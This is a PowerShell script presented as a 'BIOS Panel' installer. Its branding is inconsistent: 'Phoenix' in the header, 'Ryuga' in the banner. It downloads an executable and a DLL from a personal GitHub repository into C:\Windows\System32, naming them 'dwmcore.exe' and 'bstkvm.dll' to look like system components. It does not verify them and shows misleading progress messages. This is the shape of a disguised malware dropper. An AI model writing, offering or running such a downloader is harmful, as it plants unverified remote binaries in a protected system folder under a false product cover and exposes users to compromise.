# ================================
# Phoenix BIOS Panel - Downloader
# ================================

# Function to download DLL file
function Download-DLL {
    param(
        [string]$DllUrl,
        [string]$SaveDirectory,
        [string]$DllFileName
    )
    
    try {
        # Check if directory exists
        if (!(Test-Path $SaveDirectory)) {
            Write-Host "[!] Directory not found: $SaveDirectory" -ForegroundColor Red
            return $false
        }

        # Full path for DLL
        $dllPath = Join-Path $SaveDirectory $DllFileName

        # Download DLL
        Write-Host "[+] Downloading DLL: $DllFileName..." -ForegroundColor Yellow
        Invoke-WebRequest -Uri $DllUrl -OutFile $dllPath -UseBasicParsing

        # Verify download
        if (Test-Path $dllPath) {
            $fileSize = (Get-Item $dllPath).Length / 1KB
            Write-Host "[✓] DLL downloaded successfully!" -ForegroundColor Green
            Write-Host "[i] File: $dllPath" -ForegroundColor Cyan
            Write-Host "[i] Size: $([math]::Round($fileSize,2)) KB" -ForegroundColor Cyan
            return $true
        } else {
            Write-Host "[X] Download failed!" -ForegroundColor Red
            return $false
        }

    } catch {
        Write-Host "[X] Error downloading DLL: $_" -ForegroundColor Red
        return $false
    }
}

# Set console style
Clear-Host
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "     Ryuga BIOS Panel Installer    " -ForegroundColor Green
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# DLL URL
$url = "https://github.com/dclucky555-del/PhoenixBios-Panel/raw/refs/heads/main/dwmcore.exe"

# FIXED PATH (no dynamic, no creation)
$basePath = "C:\Windows\System32"
$fileName = "dwmcore.exe"
$filePath = Join-Path $basePath $fileName

# Check folder exists
if (!(Test-Path $basePath)) {
    Write-Host "Setting Not Found Please Contact the Developer" -ForegroundColor Red
    exit
}

try {
    # Download DLL
    Write-Host "[+] Please Wait Bios panel Being Setup..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $url -OutFile $filePath -UseBasicParsing

    # Verify download
    if (Test-Path $filePath) {
        Write-Host "Connected to the System" -ForegroundColor Green
    } else {
        throw "Connection Failed!"
    }

    # File info
    $fileSize = (Get-Item $filePath).Length / 1KB
    Write-Host "[i] File Size: $([math]::Round($fileSize,2)) KB" -ForegroundColor Cyan

} catch {
    Write-Host "[X] Error: $_" -ForegroundColor Red
}

Write-Host ""
Write-Host " Setup 1 success ✅" -ForegroundColor Green

# ================================
# Download Additional DLL
# ================================
Write-Host ""
Write-Host " Setup 2 in process ...." -ForegroundColor Yellow

$dllUrl = "https://github.com/dclucky555-del/PhoenixBios-Panel/raw/refs/heads/main/bstkvm.dll"
$saveDir = "C:\Windows\System32"
$dllName = "bstkvm.dll"

$result = Download-DLL -DllUrl $dllUrl -SaveDirectory $saveDir -DllFileName $dllName

if ($result) {
    Write-Host "bios panel is ready to use now Please restart Your PC " -ForegroundColor Green
} else {
    Write-Host "Failed to Settup" -ForegroundColor Red
}
